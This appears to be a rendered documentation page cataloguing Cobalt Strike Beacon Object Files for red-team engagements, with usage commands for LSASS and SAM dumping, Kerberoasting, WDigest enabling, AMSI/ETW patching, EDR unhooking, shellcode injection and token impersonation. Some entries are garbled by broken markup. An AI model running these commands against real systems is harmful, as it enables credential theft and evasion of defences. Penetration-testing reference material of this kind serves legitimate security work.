<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>CobaltStrike BOF Collections - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "CobaltStrike BOF Collections", url: "#_top", children: [
              {title: "Enumeration", url: "#enumeration" },
              {title: "Executing .NET Assemblies", url: "#executing-net-assemblies" },
              {title: "Exploitation", url: "#exploitation" },
          ]},
          {title: "Koh client BOF", url: "#koh-client-bof", children: [
          ]},
          {title: "DO NEFARIOUS STUFF HERE....", url: "#do-nefarious-stuff-here", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="cobaltstrike-bof-collections">CobaltStrike BOF Collections</h1>
<p>Useful Cobalt Strike Beacon Object Files (BOFs) used during red teaming and penetration testing engagements.</p>
<hr />
<h3 id="enumeration">Enumeration</h3>
<ul>
<li>
<p><a href="https://github.com/trustedsec/CS-Situational-Awareness-BOF"><strong>TrustedSec Situational Awareness BOF</strong></a><br />
BOF that provides host enumeration and awarness commands which are more opsec friendly<br />
Example commands include:<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>arp --&gt; List arp tables
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>ipconfig --&gt; Run ipconfig
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>ldapsearch [query]
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>listdns --&gt; Pulls DNS cache
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>netuser [username] [opt: domain] --&gt; Get info on user account
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>nslookup [hostname] --&gt; Perform DNS query
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>tasklist --&gt; Get local running processes
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/outflanknl/FindObjects-BOF"><strong>Find Objects BOF</strong></a><br />
Use direct system calls to enumerate processes for specific loaded modules (amsi.dll, clr.dll) or process handles (lsass.exe)<br />
Avoids fork&amp;run<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>FindModule amsi.dll
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>FindProcHandle lsass.exe
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/rvrsh3ll/BOF_Collection"><strong>BOF Collection</strong></a><br />
A set of BOFs useful for enumeration and exploitation. Examples include:<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>inline-execute GetDomainInfo.o --&gt; Get domain info from DC
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>inline-execute GetClipboard.o --&gt; Prints any text on the user&#39;s clipboard
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>enumwifi --&gt; Enumerate wifi connections
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>dumpwifi Wifi_Profile_Name --&gt; Dump wifi cleartext credentials
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>bofportscan 192.168.1.10 3389 --&gt; Port scanner
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>inline-execute RegistryPersistence.o Install --&gt; Install registry persistence
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>inline-execute RegistryPersistence.o Remove --&gt; Remove registry persistence
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/boku7/whereami"><strong>whereami</strong></a><br />
A "Where Am I" BOF which is a way to run the whoami.exe binary but in an opsec safe way by pulling the info from the current beacon process memory.<br />
Also pulls current environment variables.<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/RiccardoAncarani/BOFs"><strong>RiccardoAncarani BOFs</strong></a><br />
A useful BOF collection to perform various tasks in a safer opsec way.
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>send_shellcode_via_pipe &lt;pipe&gt; &lt;file&gt; --&gt; Send shellcode or any byte via a named pipe
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>cat &lt;file&gt; --&gt; Read file, supports remote shares
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>wts_enum_remote_processes &lt;host&gt; --&gt; Enumerate remote processes using WTS APIs
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>unhook &lt;module&gt;, unhook ntdll.dll --&gt; Use direct syscalls to unhook APIs of a specific DLL (works only on 64-bit beacons)
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/outflanknl/C2-Tool-Collection"><strong>Outflank C2 Tool Collection</strong></a><br />
Great list of useful tools converted to BOFs for better opsec.<br />
Tools like add machine account, kerberoast, LAPS password dump, SMB info, LDAP AD spray, and more!
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>GetMachineAccountQuota --&gt; Get domain machine account quota
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>AddMachineAccount [*Computername] [Optional Password] --&gt; Create new machine account - requires MachineAccountQuota to create new account
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>Domaininfo --&gt; Enumerate AD domain
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>Kerberoast list --&gt; List SPN enabled accounts
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>Kerberoast roast SamAccountName --&gt; Kerberoast specific username
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>Lapsdump &lt;computername&gt; --&gt; Dump LAPS passwowrds on remote systems within AD (requires elevated privileges on target)
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>Psc --&gt; Show detailed information from processes with established TCP and RDP connections
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>Psw --&gt;     Show window titles from processes with active windows
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>Psx --&gt; Show detailed information from all processes running on the system and provides a summary of installed security products and tools.
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>Smbinfo &lt;compuername&gt; --&gt; Get SMB info of remote system instead of using CS portscan SMB
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>Winver --&gt; Shows the version of Windows that is running on the local system
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/sliverarmory/tgtdelegation"><strong>tgtdelegation</strong></a><br />
Kerberos ticket delegation - Obtain usable TGTs for the current user, does not require Admin privileges!<br />
Request TGT of active user in the current domain obtained from USERDNSDOMAIN environment variable, outputs TGT blobs to .kirbi and .ccache files<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>tgtdelegation currentdomain default
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>[+] received output:
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>[+] tgtdelegation succeeded!
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>[+] Invoking tgtParse.py to obtain a usable .ccache!
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>[+] Successfully decrypted the AP-REQ response!
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>[+] Local path to usable .ccache: /home/loki@MARVEL.LOCAL.ccache
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>[+] Local path to usable .kirbi: /home/loki@MARVEL.LOCAL.kirbi
</span></code></pre></div>
Now use .ccache or .kirbi files offline on a Linux system to load TGT into memory: <br />
```export KRB5CCNAME=/home/loki@MARVEL.LOCAL.ccache
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&lt;br /&gt;
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Continue to use ticket in memory with other tooling of your choice through SOCKS proxy! (i.e. Impacket&#39;s `-k -no-pass` command) &lt;br /&gt;
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>- [**PrivKit**](https://github.com/mertdas/PrivKit)&lt;br /&gt;
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>Windows privilege escalation BOF kit used for detecting priv esc vulnerabilities including unquoted service paths, hijackable paths, autologon registry keys, etc.&lt;br /&gt;
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>Check for all vulnerabilities supported: &lt;br /&gt;
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>```privcheck
</span></code></pre></div></p>
</li>
</ul>
<hr />
<h3 id="executing-net-assemblies">Executing .NET Assemblies</h3>
<ul>
<li>
<p><a href="https://github.com/anthemtotheego/InlineExecute-Assembly"><strong>InlineExecute-Assembly</strong></a><br />
Perform .NET assembly execution of any .NET executable without any prior modifications required<br />
The BOF also supports several flags to disabling AMSI via in memory patching, disabling and restoring ETW via in memory patching, or customization of the CLR App Domain name to be created<br />
```inlineExecute-Assembly --dotnetassembly /home/Seatbelt.exe --assemblyargs AntiVirus AppLocker --etw --amsi --mailslot totallyLegitMailslot
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>- [**inject-assembly**](https://github.com/kyleavery/inject-assembly)&lt;br /&gt;
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Another alternative .NET executable loader to inject an assembly into a running process&lt;br /&gt;
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>```inject-assembly 0 /home/Rubeus.exe [args...]
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/CCob/BOF.NET"><strong>BOF.NET</strong></a><br />
Critical tool for red teams that allows you to run .NET assemblies as BOFs within the beacon process<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>bofnet_init --&gt; Start BOF.NET
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>bofnet_listassemblies --&gt; List loaded .NET assemblies
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>bofnet_load /Path/To/Assembly.exe --&gt; Load assembly
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>bofnet_execute bof_name [args] --&gt; Execute assembly
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>bofnet_shutdown --&gt; Kill BOF.NET
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/williamknows/BOF.NET/tree/main"><strong>Modified BOF.NET</strong></a><br />
Updated BOF.NET repo with the added <code>bofnet_executeassembly</code> command to easily call .NET assemblies<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>bofnet_init --&gt; Start BOF.NET
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>bofnet_load /Path/To/Assembly.exe --&gt; Load assembly
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>bofnet_executeassembly AssemblyName arg1 arg2 arg3 --&gt; Execute .NET assembly
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>bofnet_executeassembly Seatbelt -group=remote --&gt; SeatBelt execution example
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>bofnet_shutdown --&gt; Kill BOF.NET
</span></code></pre></div></p>
</li>
</ul>
<hr />
<h3 id="exploitation">Exploitation</h3>
<ul>
<li>
<p><a href="https://github.com/ajpc500/BOFs"><strong>ajpc500 BOFs</strong></a><br />
A collection of <strong>very</strong> useful BOFs for various utilities including different techniques of shellcode injection with syscalls, process dumping (LSASS!), and patching ETW for better evasion.<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>etw stop --&gt; Patch etw
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>syscalls_inject &lt;PID&gt; &lt;listener_name&gt; / syscalls_shinject &lt;PID&gt; &lt;path_to_bin&gt; --&gt; Syscalls shellcode injection
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>syscalls_spawn &lt;listener&gt; / syscalls_shspawn &lt;path_to_bin&gt; --&gt; Spawn and syscalls injections
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>static_syscalls_apc_spawn &lt;listener&gt; / static_syscalls_apc_spawn &lt;path_to_bin&gt; --&gt; Spawn and static syscalls shellcode njection (NtQueueApcThread)
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>static_syscalls_inject &lt;PID&gt; &lt;listener_name&gt; / static_syscalls_shinject &lt;PID&gt; &lt;path_to_bin&gt; --&gt; Static syscalls shellcode injection (NtCreateThreadEx)
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>static_syscalls_dump &lt;PID&gt; [path_to_output] --&gt; Process dump with syscalls (i.e. Dump LSASS!)
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/iilegacyyii/ThreadlessInject-BOF">Threadless Inject BOF</a>
This process injection BOF has to be used by remotely hooking a function and specify which DLL/function you want to target for injecting shellcode into. <br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>threadless-inject &lt;pid&gt; &lt;dll&gt; &lt;export function&gt; &lt;shellcode path&gt;
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>threadless-inject 1234 ntdll.dll NtOpenFile shellcode.bin --&gt; Inject into existing process
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/rookuu/BOFs"><strong>MiniDumpWriteDump</strong></a><br />
Uses static syscalls to dump a process such as LSASS to output file<br />
```minidumpwritedump <PID> <path_of_dmp?>
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>- [**SilentLsassDump**](https://github.com/josephkingstone/BOFs-2/)&lt;br /&gt;
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Uses direct syscalls generated from [https://github.com/outflanknl/InlineWhispers](InlineWhispers)&lt;br /&gt;
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Dump the LSASS process via the silent process exit mechanism into the C:\Temp directory&lt;br /&gt;
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>```silentLsassDump &lt;LSASS PID&gt;
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/EncodeGroup/BOF-RegSave"><strong>RegSave BOF</strong></a><br />
BOF to dump SAM, SYSTEM, and SECURITY database from a local system. <br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>bof-regsave c:\temp\ --&gt; Dumps SAM database files to target folder C:\temp\
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/rsmudge/unhook-bof"><strong>Unhook BOF</strong></a><br />
Created by Raphael Mudge, this BOF will attempt to unhook userland APIs to bypass EDR<br />
Sort of the "hail mary" for attempting to unhook APIs<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/outflanknl/WdToggle"><strong>WdToggle</strong></a><br />
Enables WDigest credential caching using direct system calls<br />
Bypasses Windows Credential Guard if enabled<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>inline-execute WdToggle.o --&gt; First enable WdDigest caching
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>logonpasswords --&gt; Second, wait for users to login and then run Mimikatz to dump their newly cached cleartext passwords
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/trustedsec/CS-Remote-OPs-BOF"><strong>TrustedSec CS-Remote-OPs-BOF</strong></a><br />
Great repo of new BOFs from TrustedSec to follow up their SituationalAwareness BOFs.<br />
Includes dumping a process, decrypting Chrome keys, persistence techniques (registry, scheduled tasks, services), and more!
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>adcs_request --&gt; Request an enrollment certificate
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>procdump --&gt; Dump specified process to output file
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>reg_set --&gt; Set/create a registry key
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>sc_create --&gt; Create a new service
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>schtaskscreate --&gt; Create a new scheduled task
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>setuserpass --&gt; Set a users password
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/boku7/injectAmsiBypass"><strong>Inject AMSI Bypass</strong></a><br />
BOF that bypasses AMSI in a remote process with code injection<br />
```inject-amsiBypass <PID>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>- [**Inject ETW Bypass**](https://github.com/boku7/injectEtwBypass)&lt;br /&gt;
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Inject ETW Bypass into Remote Process via Syscalls&lt;br /&gt;
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>```injectEtwBypass &lt;PID&gt;
</span></code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/cube0x0/BofRoast"><strong>Kerberoast BOF</strong></a><br />
BOF for targeted Kerberoasting against input SPN to roast<br />
Returns TGS that you can pass to apreq2hashcat.py (provided in repo) to output the hashcat format<br />
```kerberoast SPN/HOSTNAME.domain.local
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>- [**Koh**](https://github.com/GhostPack/Koh)&lt;br /&gt;
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>GhostPack BOF that allows for the capture of user credentials via purposeful token/logon session leakage.&lt;br /&gt;
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>Koh has a BOF client for capturing logon tokens in Cobalt Strike and a C# capture server to negotiate captured tokens for new logon sessions.&lt;br /&gt;
</span></code></pre></div></p>
</li>
</ul>
<h1 id="koh-client-bof">Koh client BOF</h1>
<p>help koh
  koh list              - lists captured tokens
  koh groups LUID       - lists the group SIDs for a captured token
  koh filter list       - lists the group SIDs used for capture filtering
  koh filter add SID    - adds a group SID for capture filtering
  koh filter remove SID - removes a group SID from capture filtering
  koh filter reset      - resets the SID group capture filter
  koh impersonate LUID  - impersonates the captured token with the give LUID
  koh release all       - releases all captured tokens
  koh release LUID      - releases the captured token for the specified LUID
  koh exit              - signals the Koh server to exit</p>
<p>koh list --&gt; List current logon sessions
koh impersonate <LUID> --&gt; Impersonate a logon session from above output</p>
<p>ls \dc.theshire.local\C$ --&gt; Use the impersonated privileged logon session to interact with a target system
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>- [**Cobalt-Clip**](https://github.com/DallasFR/Cobalt-Clip)&lt;br /&gt;
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>A clipboard add-on for Cobalt Strike to interact with the victim&#39;s clipboard. With Cobalt-Clip you can dump, edit and monitor the content of a clipboard.&lt;br /&gt;
</span></code></pre></div>
dumpclip --&gt; Dump current contents of clipboard
set-clipboard-data --&gt; Modify victims clipboard data
clipmon --&gt; Monitor the clipboard for new content and output to console
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>- [**BOF-patchit**](https://github.com/ScriptIdiot/BOF-patchit/)&lt;br /&gt;
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>A very easy solution to patch AMSI or ETW. Patches AMSI/ETW for the currently running x64 process.
</span></code></pre></div>
patchit check --&gt; List if AMSI or ETW are currently patched
patchit all --&gt; Patch both AMSI and ETW
patchit amsi --&gt; Only patch AMSI
patchit etw --&gt; Only patch ETW</p>
<h1 id="do-nefarious-stuff-here">DO NEFARIOUS STUFF HERE....</h1>
<p>patchit revertAll --&gt; Revert both AMSI and ETW
patchit revertAmsi --&gt; Revert only AMSI
patchit revertEtw --&gt; Revert only ETW
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>- [**ScreenshotBOF**](https://github.com/CodeXTF2/ScreenshotBOF)&lt;br /&gt;
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>Uses WinAPI and avoids fork&amp;run to take a screenshot.&lt;br /&gt;
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>`screenshot_bof output.bmp 1`
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>- [**nanorubeus**](https://github.com/wavvs/nanorobeus)&lt;br /&gt;
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>BOF equivalent of Rubeus for managing Kerberos tickets. It can be used cross-platform for multiple C2s including Cobalt Strike, Sliver and Brute Ratel.
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>
</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>&lt;br /&gt;
</span></code></pre></div>
nanorobeus64 luid --&gt; Get logon current ID
nanorobeus64 klist --&gt; List all Kerberos tickets
nanorobeus64 dump /all --&gt; Dump all Kerberos tickets, requires local admin privileges
nanorobeus64 kerberoast /spn:HTTP/server.fortress.local --&gt; Kerberoast a specific SPN
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>### Miscellaneous
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>- [**BOF Template**](https://github.com/Cobalt-Strike/bof_template)&lt;br /&gt;
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>Used for creating your very own BOFs!
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>- [**BOF Hound**](https://github.com/fortalice/bofhound)&lt;br /&gt;
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>An offline BloodHound ingestor and LDAP parser to be used with TrustedSec&#39;s [&quot;ldapsearch&quot;](https://github.com/trustedsec/CS-Situational-Awareness-BOF).&lt;br /&gt;
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>Use ldapsearch in Cobalt Strike to gather data and then use bofhound on your CS logs to generate JSON files for importing into BloodHound.&lt;br /&gt;
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>```bofhound -o /data/
</span></code></pre></div></p>
<ul>
<li><a href="https://github.com/outflanknl/HelpColor"><strong>Help Color</strong></a><br />
Color helper Aggressor script for coloring "help" output based on command type and OPSEC</li>
</ul>
<p><br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>
</span></code></pre></div></p>
<ul>
<li><a href="https://github.com/WKL-Sec/HiddenDesktop"><strong>Hidden Desktop BOF</strong></a><br />
